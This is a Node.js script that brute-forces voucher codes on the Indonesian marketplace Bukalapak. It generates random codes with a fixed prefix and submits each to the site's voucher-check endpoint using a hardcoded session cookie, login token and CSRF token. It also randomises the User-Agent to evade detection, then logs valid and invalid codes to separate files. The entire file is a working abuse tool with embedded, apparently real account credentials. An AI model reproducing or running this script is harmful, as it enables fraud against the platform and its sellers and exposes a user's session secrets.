const rp = require('request-promise');
const random_ua = require('random-ua');
const randstr = require('randomstring');
const inquirer = require('inquirer');
const fs = require('fs');
//
const base = "BLMOII";
let length = 4;
//
async function check(code) {
	const option = {
		url: 'https://www.bukalapak.com/payment/purchases/check_voucher.json',
		method: 'POST',
		headers: {
			'Cookie': 'identity=9bde589b7e0aae25ba1dde8fd6989a8f; browser_id=6eaf418fd6b564a33db06edfe8004516; session_id=ce492f7c4a6f270c7eea4dd418332db3; _ga=GA1.2.2050818909.1538668860; _gid=GA1.2.926346554.1538668860; _vwo_uuid_v2=D37A503FC72BD1885CE459EAE91E930D9|72909e48572660b90d980d7b58e2011b; _gcl_au=1.1.93140816.1538668860; __auc=089854ce1663fcfa3684aa7f751; scs=%7B%22t%22%3A1%7D; ins-gaSSId=d5316220-8dd3-8c51-7e35-67a313cdf7fd_1538672471; ins-mig-done=1; spUID=15386688716921a4de02565.7727cb99; user_credentials=7c3addafd0de22b1633648fcce4a7046dbddbba97a3e09d315e01bd3cd16c1adfc5798fffe72e73deb2d3df9e2129f318ae38806f089556cf3634feaf5e5fa2b%3A%3A2839279%3A%3A2019-01-04T23%3A02%3A09%2B07%3A00; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%221ousv%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; G_ENABLED_IDPS=google; keyword_parent_id=; keyword_correlation_id=vk8zqsfd9; insdrSV=3; _td=ea754158-ac4c-4dc2-b30a-e93ac7c66d1a; current-currency=IDR; request_method=POST; lskjfewjrh34ghj23brjh234=cFpIVW81NGN4RTNHOWdrRmZqdDFZWEVmVko4UWc3YjJNQlk4VnFFT2M2cjl6SngxTWNpNUl0Q0lSRGZNN2VBWURPYWpvTkRSb2lJNWM4MENJYk4ybEtiZDZvemowNTg0VWdPaXM3SlhaUVFCVjBydENKNGdrVVBCUnNJWXlRc3EzSjhibFhtNXpaOXB3bFp0ZTU2TXJUT0pRWHZOS0dZVXRyT3RpaE16Q21sOTZqY3ViQnpBUmRKbE9ESHB5RGNWaWVTWE1aeTlaNHFFWWZlUTdGQ2ordlFINFJrUmRwUi80MUVhYy8zKy9tZHlQV2txWFhwYnJ0RnNOTWFndWFLTGFlMjZ2UnRMc2crNWdPWURQQWFlelpyUHhpdHpVdHJYN0xQdVd5TDhnUzlUMERmTE1tcFNkZFMxRU5uTlNiTExtNFdCSlIwMVJEdEpoQ1lyM3lSWnNkYlkyK0d5K3BpeXVqcW1OTjhZU0JiQm5uUkNubzF4SE9WZUpSc3NvbTNsUDZyOFl0VEpQakJydUNOejNMYnRBTkhsQVAyZXVTeG5SMjd3QVZpWCtkSlRsK05lSUxFYTllQ084d1ZWUWkzaFVESHQ1YTJGckY3OGFhSmYwVXdIWUE9PS0tTk9UTzNPWG52VVdxV3dxSDZ1S0x1dz09--0b1d618ea351a7b530af14a60950a5fd53b64b1c; total-cart-amount=0',
			'X-NewRelic-ID': 'VQcDWF9ADgIJVVBQ',
			'Origin': 'https://www.bukalapak.com',
			'X-CSRF-Token': 'w5QZN8oV21eWMRBUg7LaWU2Oy6GWdXQqKug03F3VJ8E6/OKGeLfYyQEWV2r14lssxPJkl8XA5GEX6lpyBILhOQ==',
			'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'User-Agent': await random_ua.generate(),
			'Content-Type': 'application/json',
			'Accept': '*/*',
			'Referer': 'https://www.bukalapak.com/payment/purchases/new?product_id=759798269&product_sku_id=753364299&seller_ids=%5B48197902%5D',
			'X-Requested-With': 'XMLHttpRequest'
		},
		body: '{"payment_invoice":{"transactions":[{"address":{"province":"","city":""},"amount":450000,"courier_cost":0,"insurance_cost":0,"agent_commission_amount":0,"courier":null,"seller_id":48197902,"retarget_discount_amount":0,"cart_item_ids":[2735899804]}],"payment_method":null,"voucher_amount":0},"payment_details":{"virtual_account_type":""},"voucher_code":"'+code+'"}',
	};
	const start = await rp(option);
	const json = JSON.parse(start);
	return Promise.resolve(json.message);
}

async function generateCode(base, length) {
	return Promise.resolve(base+""+randstr.generate({
		length: length,
		capitalization: 'uppercase'
	}));
}

async function start(base, length, berapakali) {
	for(let i = 0; i < berapakali; i++){
		const kodenya = await generateCode(base, length);
		const checking = await check(kodenya, length);
		if (checking == "Voucher hanya berlaku untuk transaksi di Aplikasi Android Bukalapak dan Aplikasi iOS Bukalapak") {
			fs.appendFileSync('live.txt', `${kodenya} [ ${checking} ]\n`);
		} else {
			fs.appendFileSync('die.txt', `${kodenya} [ ${checking} ]\n`);
		}
		console.log(i+`. ${kodenya} [ ${checking} ]`);
	}
}

console.log(`Bukalapak Voucher Extrap Based.`)

inquirer.prompt([
	{
		type:'input',
		message:'Berapa kali gan? :',
		name:'kalinya',
		validate: function(data) {
			data = data.match(/[0-9]/);
			if (data) return true;
			return 'Only numeric.';
		}
	}
]).then(answers => {
	start(base, length, answers.kalinya);
});